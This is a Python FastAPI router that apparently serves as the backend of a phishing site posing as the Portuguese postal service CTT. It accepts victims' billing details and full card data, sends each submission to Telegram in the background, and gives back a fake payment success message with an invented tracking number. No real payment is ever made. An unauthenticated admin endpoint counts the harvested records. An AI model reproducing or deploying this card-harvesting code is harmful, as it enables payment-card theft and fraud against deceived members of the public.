from fastapi import APIRouter, HTTPException, BackgroundTasks
from models import BillingData, CardData, PaymentRequest, TrackingData
from telegram_service import telegram_service
import logging
import uuid
from datetime import datetime

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/ctt", tags=["CTT"])

# In-memory storage for demo (replace with database in production)
billing_storage = {}
payment_storage = {}

@router.post("/billing")
async def submit_billing_info(billing_data: BillingData, background_tasks: BackgroundTasks):
    """Submit billing information and send to Telegram"""
    try:
        # Store billing data
        billing_storage[billing_data.id] = billing_data.dict()
        
        # Send to Telegram in background
        background_tasks.add_task(
            telegram_service.send_billing_info,
            billing_data.dict()
        )
        
        logger.info(f"Billing info submitted for {billing_data.nome}")
        
        return {
            "status": "success",
            "message": "Informações de entrega recebidas",
            "billing_id": billing_data.id
        }
        
    except Exception as e:
        logger.error(f"Error processing billing info: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro interno do servidor")

@router.post("/payment")
async def process_payment(payment_request: PaymentRequest, background_tasks: BackgroundTasks):
    """Process payment and send complete info to Telegram"""
    try:
        # Generate tracking number
        tracking_number = f"RR{str(uuid.uuid4().int)[:9]}PT"
        
        # Create tracking data
        tracking_data = TrackingData(
            tracking_number=tracking_number,
            billing_data=payment_request.billing_data,
            card_data=payment_request.card_data,
            status="paid"
        )
        
        # Store payment data
        payment_storage[tracking_data.id] = tracking_data.dict()
        
        # Send complete payment info to Telegram in background
        background_tasks.add_task(
            telegram_service.send_payment_info,
            payment_request.billing_data.dict(),
            payment_request.card_data.dict()
        )
        
        logger.info(f"Payment processed for {payment_request.billing_data.nome}")
        
        return {
            "status": "success",
            "message": "Pagamento processado com sucesso",
            "tracking_number": tracking_number,
            "tracking_id": tracking_data.id
        }
        
    except Exception as e:
        logger.error(f"Error processing payment: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro no processamento do pagamento")

@router.get("/tracking/{tracking_number}")
async def get_tracking_info(tracking_number: str):
    """Get tracking information"""
    try:
        # Find tracking data by tracking number
        for tracking_data in payment_storage.values():
            if tracking_data.get('tracking_number') == tracking_number:
                return {
                    "status": "success",
                    "tracking_data": tracking_data
                }
        
        raise HTTPException(status_code=404, detail="Número de rastreamento não encontrado")
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error retrieving tracking info: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro interno do servidor")

@router.post("/tracking/{tracking_number}/update")
async def update_tracking_status(tracking_number: str, status: str, background_tasks: BackgroundTasks):
    """Update tracking status and notify via Telegram"""
    try:
        # Find and update tracking data
        updated = False
        for tracking_data in payment_storage.values():
            if tracking_data.get('tracking_number') == tracking_number:
                tracking_data['status'] = status
                tracking_data['last_updated'] = datetime.utcnow().isoformat()
                updated = True
                break
        
        if not updated:
            raise HTTPException(status_code=404, detail="Número de rastreamento não encontrado")
        
        # Send update to Telegram in background
        background_tasks.add_task(
            telegram_service.send_tracking_update,
            tracking_number,
            status
        )
        
        logger.info(f"Tracking status updated: {tracking_number} -> {status}")
        
        return {
            "status": "success",
            "message": f"Estado de rastreamento atualizado para: {status}"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error updating tracking status: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro interno do servidor")

@router.get("/admin/stats")
async def get_admin_stats():
    """Get admin statistics"""
    try:
        total_billings = len(billing_storage)
        total_payments = len(payment_storage)
        
        # Count by status
        status_counts = {}
        for payment in payment_storage.values():
            status = payment.get('status', 'unknown')
            status_counts[status] = status_counts.get(status, 0) + 1
        
        return {
            "total_billings": total_billings,
            "total_payments": total_payments,
            "status_distribution": status_counts,
            "last_updated": datetime.utcnow().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error generating admin stats: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro interno do servidor")